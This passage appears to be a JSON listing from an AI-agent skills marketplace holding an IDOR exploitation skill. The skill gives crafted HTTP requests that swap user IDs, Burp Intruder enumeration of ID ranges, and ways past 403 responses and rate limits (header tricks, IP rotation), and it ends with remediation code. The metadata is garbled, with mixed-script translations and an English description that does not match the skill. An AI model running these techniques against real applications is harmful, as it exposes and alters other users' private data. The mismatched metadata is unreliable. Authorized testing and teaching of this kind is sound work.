照と静的ファイル参照を含みます","ko":"웹 애플리케이션의 IDOR 취약점을 식별하고 악용하기 위한 체계적인 방법을 제공합니다. 데이터베이스 객체 참조 및 정적 파일 참조를 포함합니다","es":"Este skill proporciona metodologías para identificar y explotar vulnerabilidades IDOR en aplicaciones web","fr":"Ce skill fournit des méthodologies pour identifier et exploiter les vulnérabilités IDOR dans les applications web","de":"Dieses Skill bietet Methoden zur Identifizierung und Ausnutzung von IDOR-Schwachstellen in Webanwendungen","pt":"O teste de vulnerabilidade IDOR é um método sistemático para identificar e explorar vulnerabilidades de referência de objeto direta insegura em aplicações web.","ru":"Тестирование уязвимости IDOR - это систематический метод выявления и использования уязвимостей не安全ной прямой ссылки на объект в веб-приложениях.","ar":"اختبار ثغرة أمان IDOR هو метод منهجي لاكتشاف واستغلال ثغرات أمان الارتباط المباشر غير الآمن في التطبيقات الويب.","en":"Know Your Codebase - AI-powered code tasks with transparency. The antidote to vibe coding."},"definition":{"en":"Know Your Codebase - AI-powered code tasks with transparency. The antidote to vibe coding."},"features":{"zh":["识别IDOR漏洞","利用IDOR漏洞","数据库对象引用检测","静态文件引用检测","Burp Suite集成"],"ja":["IDOR脆弱性の識別","IDOR脆弱性の利用","データベースオブジェクト参照の検出","静的ファイル参照の検出","Burp Suiteとの統合"],"ko":["IDOR 취약점 식별","IDOR 취약점 악용","데이터베이스 객체 참조 감지","정적 파일 참조 감지","Burp Suite 통합"],"es":["Metodologías sistemáticas para la detección de vulnerabilidades IDOR","Técnicas de detección mediante manipulación de parámetros y enumeración","Explotación de vulnerabilidades mediante Burp Suite","Estrategias de remediación para proteger aplicaciones contra accesos no autorizados","Análisis de referencias de objetos de base de datos y archivos estáticos","Identificación de vulnerabilidades IDOR en aplicaciones web"],"fr":["Méthodologies systématiques pour la détection de vulnérabilités IDOR","Techniques de détection par manipulation de paramètres et énumération","Exploitation de vulnérabilités via Burp Suite","Stratégies de remédiation pour protéger les applications contre les accès non autorisés","Analyse de références d''objets de base de données et de fichiers statiques","Identification de vulnérabilités IDOR dans les applications web"],"de":["Systematische Methoden zur Erkennung von IDOR-Schwachstellen","Techniken zur Erkennung durch Parametermanipulation und Enumeration","Ausnutzung von Schwachstellen mittels Burp Suite","Strategien zur Behebung, um Anwendungen vor nicht autorisiertem Zugriff zu schützen","Analyse von Datenbankobjektverweisen und statischen Dateiverweisen","Erkennung von IDOR-Schwachstellen in Webanwendungen"],"pt":["Métodos sistemáticos para identificar vulnerabilidades IDOR","Técnicas de detecção usando manipulação de parâmetros e enumeração","Exploração via Burp Suite","Estratégias de remediação para proteger aplicações contra acesso não autorizado"],"ru":["Систематические методы выявления уязвимостей IDOR","Методы обнаружения с помощью манипуляции параметрами и перечисления","Эксплуатация через Burp Suite","Стратегии смягчения для защиты приложений от неавторизованного доступа"],"ar":["طرق منهجية لاكتشاف ثغرات أمان IDOR","تقنيات الكشف باستخدام تعديل المعلمات و التعداد","استغلال الثغرات من خلال Burp Suite","استراتيجيات العلاج لحماية التطبيقات من الوصول غير المصرح به"]},"keywords":{"zh":["IDOR漏洞测试","Web应用安全","直接对象引用","数据库安全","静态文件安全","Burp Suite"],"ja":["IDOR脆弱性テスト","Webアプリケーションセキュリティ","直接オブジェクト参照","データベースセキュリティ","静的ファイルセキュリティ","Burp Suite"],"ko":["IDOR 취약점 테스트","웹 애플리케이션 보안","직접 객체 참조","데이터베이스 보안","정적 파일 보안","Burp Suite"],"es":["vulnerabilidad IDOR","pruebas de seguridad","aplicaciones web","seguridad informática","Burp Suite","enumeración","manipulación de parámetros","remediación"],"fr":["vulnérabilité IDOR","tests de sécurité","applications web","sécurité informatique","Burp Suite","énumération","manipulation de paramètres","remédiation"],"de":["IDOR-Schwachstelle","Sicherheitstests","Webanwendungen","IT-Sicherheit","Burp Suite","Enumeration","Parametermanipulation","Behebung"],"pt":["teste de vulnerabilidade IDOR","segurança de aplicações web","referência de objeto direta insegura","Burp Suite","remediação de vulnerabilidades","desenvolvimento de aplicações seguras"],"ru":["тестирование уязвимости IDOR","безопасность веб-приложений","не безопасная прямая ссылка на объект","Burp Suite","смягчение уязвимостей","разработка безопасных приложений"],"ar":["اختبار ثغرة أمان IDOR","أمان التطبيقات الويب","الارتباط المباشر غير الآمن","Burp Suite","استراتيجيات العلاج من الثغرات","تطوير التطبيقات الآمنة"]}},"owner":"MAF2414","repo":"kyco","repoPath":"MAF2414/kyco","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.467Z","topics":[],"category":"community","skillMd":{"name":"idor-vulnerability-testing","description":"This skill should be used when the user asks to test for insecure direct object references, find IDOR vulnerabilities, exploit broken access control, enumerate user IDs or object references, or bypass authorization to access other users data. It provides comprehensive guidance for detecting, exploiting, and remediating IDOR vulnerabilities in web applications.","bodyPreview":"# IDOR Vulnerability Testing\n\n## Purpose\n\nProvide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.\n\n## Inputs / Prerequisites\n\n- **Target Web Application**: URL","body":"# IDOR Vulnerability Testing\n\n## Purpose\n\nProvide systematic methodologies for identifying and exploiting Insecure Direct Object Reference (IDOR) vulnerabilities in web applications. This skill covers both database object references and static file references, detection techniques using parameter manipulation and enumeration, exploitation via Burp Suite, and remediation strategies for securing applications against unauthorized access.\n\n## Inputs / Prerequisites\n\n- **Target Web Application**: URL of application with user-specific resources\n- **Multiple User Accounts**: At least two test accounts to verify cross-user access\n- **Burp Suite or Proxy Tool**: Intercepting proxy for request manipulation\n- **Authorization**: Written permission for security testing\n- **Understanding of Application Flow**: Knowledge of how objects are referenced (IDs, filenames)\n\n## Outputs / Deliverables\n\n- **IDOR Vulnerability Report**: Documentation of discovered access control bypasses\n- **Proof of Concept**: Evidence of unauthorized data access across user contexts\n- **Affected Endpoints**: List of vulnerable API endpoints and parameters\n- **Impact Assessment**: Classification of data exposure severity\n- **Remediation Recommendations**: Specific fixes for identified vulnerabilities\n\n## Core Workflow\n\n### 1. Understand IDOR Vulnerability Types\n\n#### Direct Reference to Database Objects\nOccurs when applications reference database records via user-controllable parameters:\n```\n# Original URL (authenticated as User A)\nexample.com/user/profile?id=2023\n\n# Manipulation attempt (accessing User B''s data)\nexample.com/user/profile?id=2022\n```\n\n#### Direct Reference to Static Files\nOccurs when applications expose file paths or names that can be enumerated:\n```\n# Original URL (User A''s receipt)\nexample.com/static/receipt/205.pdf\n\n# Manipulation attempt (User B''s receipt)\nexample.com/static/receipt/200.pdf\n```\n\n### 2. Reconnaissance and Setup\n\n#### Create Multiple Test Accounts\n```\nAccount 1: \"attacker\" - Primary testing account\nAccount 2: \"victim\" - Account whose data we attempt to access\n```\n\n#### Identify Object References\nCapture and analyze requests containing:\n- Numeric IDs in URLs: `/api/user/123`\n- Numeric IDs in parameters: `?id=123&action=view`\n- Numeric IDs in request body: `{\"userId\": 123}`\n- File paths: `/download/receipt_123.pdf`\n- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`\n\n#### Map User IDs\n```\n# Access user ID endpoint (if available)\nGET /api/user-id/\n\n# Note ID patterns:\n# - Sequential integers (1, 2, 3...)\n# - Auto-incremented values\n# - Predictable patterns\n```\n\n### 3. Detection Techniques\n\n#### URL Parameter Manipulation\n```\n# Step 1: Capture original authenticated request\nGET /api/user/profile?id=1001 HTTP/1.1\nCookie: session=attacker_session\n\n# Step 2: Modify ID to target another user\nGET /api/user/profile?id=1000 HTTP/1.1\nCookie: session=attacker_session\n\n# Vulnerable if: Returns victim''s data with attacker''s session\n```\n\n#### Request Body Manipulation\n```\n# Original POST request\nPOST /api/address/update HTTP/1.1\nContent-Type: application/json\nCookie: session=attacker_session\n\n{\"id\": 5, \"userId\": 1001, \"address\": \"123 Attacker St\"}\n\n# Modified request targeting victim\n{\"id\": 5, \"userId\": 1000, \"address\": \"123 Attacker St\"}\n```\n\n#### HTTP Method Switching\n```\n# Original GET request may be protected\nGET /api/admin/users/1000 → 403 Forbidden\n\n# Try alternative methods\nPOST /api/admin/users/1000 → 200 OK (Vulnerable!)\nPUT /api/admin/users/1000 → 200 OK (Vulnerable!)\n```\n\n### 4. Exploitation with Burp Suite\n\n#### Manual Exploitation\n```\n1. Configure browser proxy through Burp Suite\n2. Login as \"attacker\" user\n3. Navigate to profile/data page\n4. Enable Intercept in Proxy tab\n5. Capture request with user ID\n6. Modify ID to victim''s ID\n7. Forward request\n8. Observe response for victim''s data\n```\n\n#### Automated Enumeration with Intruder\n```\n1. Send request to Intruder (Ctrl+I)\n2. Clear all payload positions\n3. Select ID parameter as payload position\n4. Configure attack type: Sniper\n5. Payload settings:\n   - Type: Numbers\n   - Range: 1 to 10000\n   - Step: 1\n6. Start attack\n7. Analyze responses for 200 status codes\n```\n\n#### Battering Ram Attack for Multiple Positions\n```\n# When same ID appears in multiple locations\nPUT /api/addresses/§5§/update HTTP/1.1\n\n{\"id\": §5§, \"userId\": 3}\n\nAttack Type: Battering Ram\nPayload: Numbers 1-1000\n```\n\n### 5. Common IDOR Locations\n\n#### API Endpoints\n```\n/api/user/{id}\n/api/profile/{id}\n/api/order/{id}\n/api/invoice/{id}\n/api/document/{id}\n/api/message/{id}\n/api/address/{id}/update\n/api/address/{id}/delete\n```\n\n#### File Downloads\n```\n/download/invoice_{id}.pdf\n/static/receipts/{id}.pdf\n/uploads/documents/{filename}\n/files/reports/report_{date}_{id}.xlsx\n```\n\n#### Query Parameters\n```\n?userId=123\n?orderId=456\n?documentId=789\n?file=report_123.pdf\n?account=user@email.com\n```\n\n## Quick Reference\n\n### IDOR Testing Checklist\n\n| Test | Method | Indicator of Vulnerability |\n|------|--------|---------------------------|\n| Increment/Decrement ID | Change `id=5` to `id=4` | Returns different user''s data |\n| Use Victim''s ID | Replace with known victim ID | Access granted to victim''s resources |\n| Enumerate Range | Test IDs 1-1000 | Find valid records of other users |\n| Negative Values | Test `id=-1` or `id=0` | Unexpected data or errors |\n| Large Values | Test `id=99999999` | System information disclosure |\n| String IDs | Change format `id=user_123` | Logic bypass |\n| GUID Manipulation | Modify UUID portions | Predictable UUID patterns |\n\n### Response Analysis\n\n| Status Code | Interpretation |\n|-------------|----------------|\n| 200 OK | Potential IDOR - verify data ownership |\n| 403 Forbidden | Access control working |\n| 404 Not Found | Resource doesn''t exist |\n| 401 Unauthorized | Authentication required |\n| 500 Error | Potential input validation issue |\n\n### Common Vulnerable Parameters\n\n| Parameter Type | Examples |\n|----------------|----------|\n| User identifiers | `userId`, `uid`, `user_id`, `account` |\n| Resource identifiers | `id`, `pid`, `docId`, `fileId` |\n| Order/Transaction | `orderId`, `transactionId`, `invoiceId` |\n| Message/Communication | `messageId`, `threadId`, `chatId` |\n| File references | `filename`, `file`, `document`, `path` |\n\n## Constraints and Limitations\n\n### Operational Boundaries\n- Requires at least two valid user accounts for verification\n- Some applications use session-bound tokens instead of IDs\n- GUID/UUID references harder to enumerate but not impossible\n- Rate limiting may restrict enumeration attempts\n- Some IDOR requires chained vulnerabilities to exploit\n\n### Detection Challenges\n- Horizontal privilege escalation (user-to-user) vs vertical (user-to-admin)\n- Blind IDOR where response doesn''t confirm access\n- Time-based IDOR in asynchronous operations\n- IDOR in websocket communications\n\n### Legal Requirements\n- Only test applications with explicit authorization\n- Document all testing activities and findings\n- Do not access, modify, or exfiltrate real user data\n- Report findings through proper disclosure channels\n\n## Examples\n\n### Example 1: Basic ID Parameter IDOR\n```\n# Login as attacker (userId=1001)\n# Navigate to profile page\n\n# Original request\nGET /api/profile?id=1001 HTTP/1.1\nCookie: session=abc123\n\n# Response: Attacker''s profile data\n\n# Modified request (targeting victim userId=1000)\nGET /api/profile?id=1000 HTTP/1.1\nCookie: session=abc123\n\n# Vulnerable Response: Victim''s profile data returned!\n```\n\n### Example 2: IDOR in Address Update Endpoint\n```\n# Intercept address update request\nPUT /api/addresses/5/update HTTP/1.1\nContent-Type: application/json\nCookie: session=attacker_session\n\n{\n  \"id\": 5,\n  \"userId\": 1001,\n  \"street\": \"123 Main St\",\n  \"city\": \"Test City\"\n}\n\n# Modify userId to victim''s ID\n{\n  \"id\": 5,\n  \"userId\": 1000,  # Changed from 1001\n  \"street\": \"Hacked Address\",\n  \"city\": \"Exploit City\"\n}\n\n# If 200 OK: Address created under victim''s account\n```\n\n### Example 3: Static File IDOR\n```\n# Download own receipt\nGET /api/download/5 HTTP/1.1\nCookie: session=attacker_session\n\n# Response: PDF of attacker''s receipt (order #5)\n\n# Attempt to access other receipts\nGET /api/download/3 HTTP/1.1\nCookie: session=attacker_session\n\n# Vulnerable Response: PDF of victim''s receipt (order #3)!\n```\n\n### Example 4: Burp Intruder Enumeration\n```\n# Configure Intruder attack\nTarget: PUT /api/addresses/§1§/update\nPayload Position: Address ID in URL and body\n\nAttack Configuration:\n- Type: Battering Ram\n- Payload: Numbers 0-20, Step 1\n\nBody Template:\n{\n  \"id\": §1§,\n  \"userId\": 3\n}\n\n# Analyze results:\n# - 200 responses indicate successful modification\n# - Check victim''s account for new addresses\n```\n\n### Example 5: Horizontal to Vertical Escalation\n```\n# Step 1: Enumerate user roles\nGET /api/user/1 → {\"role\": \"user\", \"id\": 1}\nGET /api/user/2 → {\"role\": \"user\", \"id\": 2}\nGET /api/user/3 → {\"role\": \"admin\", \"id\": 3}\n\n# Step 2: Access admin functions with discovered ID\nGET /api/admin/dashboard?userId=3 HTTP/1.1\nCookie: session=regular_user_session\n\n# If accessible: Vertical privilege escalation achieved\n```\n\n## Troubleshooting\n\n### Issue: All Requests Return 403 Forbidden\n**Cause**: Server-side access control is implemented\n**Solution**:\n```\n# Try alternative attack vectors:\n1. HTTP method switching (GET → POST → PUT)\n2. Add X-Original-URL or X-Rewrite-URL headers\n3. Try parameter pollution: ?id=1001&id=1000\n4. URL encoding variations: %31%30%30%30 for \"1000\"\n5. Case variations for string IDs\n```\n\n### Issue: Application Uses UUIDs Instead of Sequential IDs\n**Cause**: Randomized identifiers reduce enumeration risk\n**Solution**:\n```\n# UUID discovery techniques:\n1. Check response bodies for leaked UUIDs\n2. Search JavaScript files for hardcoded UUIDs\n3. Check API responses that list multiple objects\n4. Look for UUID patterns in error messages\n5. Try UUID v1 (time-based) prediction if applicable\n```\n\n### Issue: Session Token Bound to User\n**Cause**: Application validates session against requested resource\n**Solution**:\n```\n# Advanced bypass attempts:\n1. Test for IDOR in unauthenticated endpoints\n2. Check password reset/email verification flows\n3. Look for IDOR in file upload/download\n4. Test API versioning: /api/v1/ vs /api/v2/\n5. Check mobile API endpoints (often less protected)\n```\n\n### Issue: Rate Limiting Blocks Enumeration\n**Cause**: Application implements request throttling\n**Solution**:\n```\n# Bypass techniques:\n1. Add delays between requests (Burp Intruder throttle)\n2. Rotate IP addresses (proxy chains)\n3. Target specific high-value IDs instead of full range\n4. Use different endpoints for same resources\n5. Test during off-peak hours\n```\n\n### Issue: Cannot Verify IDOR Impact\n**Cause**: Response doesn''t clearly indicate data ownership\n**Solution**:\n```\n# Verification methods:\n1. Create unique identifiable data in victim account\n2. Look for PII markers (name, email) in responses\n3. Compare response lengths between users\n4. Check for timing differences in responses\n5. Use secondary indicators (creation dates, metadata)\n```\n\n## Remediation Guidance\n\n### Implement Proper Access Control\n```python\n# Django example - validate ownership\ndef update_address(request, address_id):\n    address = Address.objects.get(id=address_id)\n    \n    # Verify ownership before allowing update\n    if address.user != request.user:\n        return HttpResponseForbidden(\"Unauthorized\")\n    \n    # Proceed with update\n    address.update(request.data)\n```\n\n### Use Indirect References\n```python\n# Instead of: /api/address/123\n# Use: /api/address/current-user/billing\n\ndef get_address(request):\n    # Always filter by authenticated user\n    address = Address.objects.filter(user=request.user).first()\n    return address\n```\n\n### Server-Side Validation\n```python\n# Always validate on server, never trust client input\ndef download_receipt(request, receipt_id):\n    receipt = Receipt.objects.filter(\n        id=receipt_id,\n        user=request.user  # Critical: filter by current user\n    ).first()\n    \n    if not receipt:\n        return HttpResponseNotFound()\n    \n    return FileResponse(receipt.file)\n```"},"lastSynced":"2026-02-18T08:30:29.702Z","agentAnalysis":{"suitability":{"en":"Perfect for Cybersecurity Agents needing advanced IDOR vulnerability testing and exploitation capabilities in web applications","zh":"非常适合需要在Web应用程序中进行高级IDOR漏洞测试和利用能力的网络安全代理","ja":"Webアプリケーションにおける高度なIDOR脆弱性テストおよび利用能力を必要とするサイバーセキュリティエージェントに最適","ko":"웹 애플리케이션에서 고급 IDOR 취약점 테스트 및 활용 기능이 필요한 사이버 보안 에이전트에게 적합","es":"Perfecto para agentes de ciberseguridad que necesitan pruebas y capacidades de explotación de vulnerabilidades IDOR avanzadas en aplicaciones web","fr":"Parfait pour les agents de cybersécurité qui ont besoin de tests et de capacités d''exploitation de vulnérabilités IDOR avancées dans les applications web","de":"Perfekt für Cyber-Sicherheitsagenten, die erweiterte IDOR-Schwachstellentests und -ausnutzungsfunctionen in Webanwendungen benötigen","pt":"Perfeito para Agentes de Cibersegurança que necessitam de capacidades avançadas de teste e exploração de vulnerabilidades IDOR em aplicações web","ru":"Идеально для агентов кибербезопасности, которым необходимы продвинутые возможности тестирования и эксплуатации уязвимостей IDOR в веб-приложениях","ar":"مثالي لعمليات وكالات الأمن السيبراني التي تحتاج إلى قدرات متقدمة لاختبار وتسخير الثغرات الأمنية IDOR في التطبيقات الويب"},"recommendation":{"en":"Empowers agents to systematically identify and exploit Insecure Direct Object Reference vulnerabilities using parameter manipulation, enumeration, and Burp Suite, enhancing web application security against unauthorized access via database object references and static file references","zh":"使代理能够系统地识别和利用不安全的直接对象引用漏洞，使用参数操作、枚举和Burp Suite，增强Web应用程序的安全性，防止通过数据库对象引用和静态文件引用进行未经授权的访问","ja":"エージェントが、パラメータ操作、列挙、Burp Suiteを使用して、不安全な直接オブジェクト参照の脆弱性を体系的に識別、利用できるようにし、Webアプリケーションのセキュリティを強化し、データベースオブジェクト参照および静的ファイル参照による未承認アクセスを防ぐ","ko":"에이전트가 매개변수 조작, 열거 및 Burp Suite를 사용하여 안전하지 않은 직접 개체 참조 취약성을 체계적으로 식별하고 활용할 수 있도록 하여 웹 애플리케이션의 보안을 강화하고 데이터베이스 개체 참조 및 정적 파일 참조를 통한 비인가 접근을 방지","es":"Permite a los agentes identificar y explotar sistemáticamente las vulnerabilidades de referencia de objeto directa insegura utilizando la manipulación de parámetros, la enumeración y Burp Suite, mejorando la seguridad de las aplicaciones web contra el acceso no autorizado a través de referencias de objetos de base de datos y referencias de archivos estáticos","fr":"Permet aux agents d''identifier et d''exploiter systématiquement les vulnérabilités de référence d''objet directe non sécurisée en utilisant la manipulation de paramètres, l''énumération et Burp Suite, améliorant ainsi la sécurité des applications web contre l''accès non autorisé via les références d''objets de base de données et les références de fichiers statiques","de":"Ermöglicht es Agenten, unsichere direkte Objektverweise-Verwundbarkeiten systematisch zu identifizieren und auszunutzen, indem sie Parametermanipulation, Aufzählung und Burp Suite verwenden, wodurch die Sicherheit von Webanwendungen gegen unbefugten Zugriff über Datenbankobjektverweise und statische Dateiverweise verbessert wird","pt":"Habilita os agentes a identificar e explorar systematicamente as vulnerabilidades de Referência Direta Insegura usando manipulação de parâmetros, enumeração e Burp Suite, melhorando a segurança das aplicações web contra acessos não autorizados via referências de objetos de banco de dados e referências de arquivos estáticos","ru":"Наделяет агентов возможностью систематически выявлять и использовать уязвимости Непосредственной Не защищенной Ссылки с помощью манипуляции параметрами, перечисления и Burp Suite, повышая безопасность веб-приложений от несанкционированного доступа через ссылки на объекты базы данных и статические файловые ссылки","ar":"تمكّن الوكالات من تحديد الثغرات الأمنية للاشارة المباشرة غير الآمنة وتسخيرها بشكل منهجي باستخدام تقنيات تحوير المعاملات والتحديد والعلبة البرمجية Burp، مما يعزز أمن التطبيقات الويب ضد الوصول غير المصرح به عبر مراجع كائنات قواعد البيانات والمراجع الملفات الثابتة"},"useCases":{"en":["Automating IDOR vulnerability detection in web applications using parameter manipulation techniques","Exploiting IDOR vulnerabilities via Burp Suite for comprehensive security testing","Developing remediation strategies to secure web applications against IDOR-based unauthorized access"],"zh":["使用参数操作技术自动检测Web应用程序中的IDOR漏洞","通过Burp Suite利用IDOR漏洞进行全面安全测试","开发补救策略以保护Web应用程序免受IDOR 기반未经授权的访问"],"ja":["パラメータ操作技術を使用してWebアプリケーションのIDOR脆弱性を自動検出する","Burp Suiteを使用してIDOR脆弱性を利用し、包括的なセキュリティテストを実施する","WebアプリケーションをIDORベースの未承認アクセスから保護するための対策戦略を開発する"],"ko":["매개변수 조작 기술을 사용하여 웹 애플리케이션의 IDOR 취약성을 자동으로 감지","Burp Suite를 사용하여 IDOR 취약성을 활용하여 종합적인 보안 테스트를 수행","웹 애플리케이션을 IDOR 기반의 비인가 접근으로부터 보호하기 위한 완화 전략을 개발"],"es":["Automatizar la detección de vulnerabilidades IDOR en aplicaciones web utilizando técnicas de manipulación de parámetros","Explotar vulnerabilidades IDOR a través de Burp Suite para pruebas de seguridad exhaustivas","Desarrollar estrategias de remediación para proteger las aplicaciones web contra el acceso no autorizado basado en IDOR"],"fr":["Automatiser la détection de vulnérabilités IDOR dans les applications web en utilisant des techniques de manipulation de paramètres","Exploiter les vulnérabilités IDOR via Burp Suite pour des tests de sécurité exhaustifs","Développer des stratégies de remédiation pour sécuriser les applications web contre l''accès non autorisé basé sur IDOR"],"de":["Automatisierung der Erkennung von IDOR-Schwachstellen in Webanwendungen mithilfe von Parametermanipulationstechniken","Ausnutzung von IDOR-Schwachstellen über Burp Suite für umfassende Sicherheitstests","Entwicklung von Sanierungsstrategien, um Webanwendungen gegen unbefugten Zugriff auf der Grundlage von IDOR zu schützen"],"pt":["Automatizar a detecção de vulnerabilidades IDOR em aplicações web usando técnicas de manipulação de parâmetros","Explorar vulnerabilidades IDOR via Burp Suite para testes de segurança abrangentes","Desenvolver estratégias de remediação para proteger aplicações web contra acessos não autorizados baseados em IDOR"],"ru":["Автоматизировать обнаружение уязвимостей IDOR в веб-приложениях с помощью методов манипуляции параметрами","Эксплуатировать уязвимости IDOR через Burp Suite для всестороннего тестирования безопасности","Разрабатывать стратегии смягчения для защиты веб-приложений от несанкционированного доступа на основе IDOR"],"ar":["أتمتة كشف الثغرات الأمنية IDOR في التطبيقات الويب باستخدام تقنيات تحوير المعاملات","تسخير الثغرات الأمنية IDOR من خلال العلبة البرمجية Burp للفحص الشامل للأمن","وضع استراتيجيات العلاج لتأمين التطبيقات الويب ضد الوصول غير المصرح به المستند إلى IDOR"]},"limitations":{"en":["Requires target web application URL","Focused on Insecure Direct Object Reference vulnerabilities","May require Burp Suite for exploitation"],"zh":["需要目标Web应用程序URL","专注于不安全的直接对象引用漏洞","可能需要Burp Suite进行利用"],"ja":["対象WebアプリケーションのURLが必要","不安全な直接オブジェクト参照の脆弱性に焦点を当てている","利用するにはBurp Suiteが必要となる可能性がある"],"ko":["대상 웹 애플리케이션 URL이 필요","안전하지 않은 직접 개체 참조 취약성에 중점을 두고 있음","활용하기에는 Burp Suite가 필요할 수 있음"],"es":["Requiere la URL de la aplicación web objetivo","Se centra en las vulnerabilidades de referencia de objeto directa insegura","Puede requerir Burp Suite para la explotación"],"fr":["Nécessite l''URL de l''application web cible","Se concentre sur les vulnérabilités de référence d''objet directe non sécurisée","Peut nécessiter Burp Suite pour l''exploitation"],"de":["Benötigt die Ziel-Webanwendungs-URL","Konzentriert sich auf unsichere direkte Objektverweis-Verwundbarkeiten","Kann Burp Suite für die Ausnutzung erfordern"],"pt":["Exige a URL da aplicação web de destino","Focado em vulnerabilidades de Referência Direta Insegura","Pode exigir Burp Suite para exploração"],"ru":["Требует URL целевого веб-приложения","Сосредоточен на уязвимостях Непосредственной Не защищенной Ссылки","Может требовать Burp Suite для эксплуатации"],"ar":["يتطلب عنوان URL للتطبيق الويب المستهدف","مركز على الثغرات الأمنية للاشارة المباشرة غير الآمنة","يمكن أن يتطلب العلبة البرمجية Burp للاتساخ"]},"version":3},"qualityScore":80}');
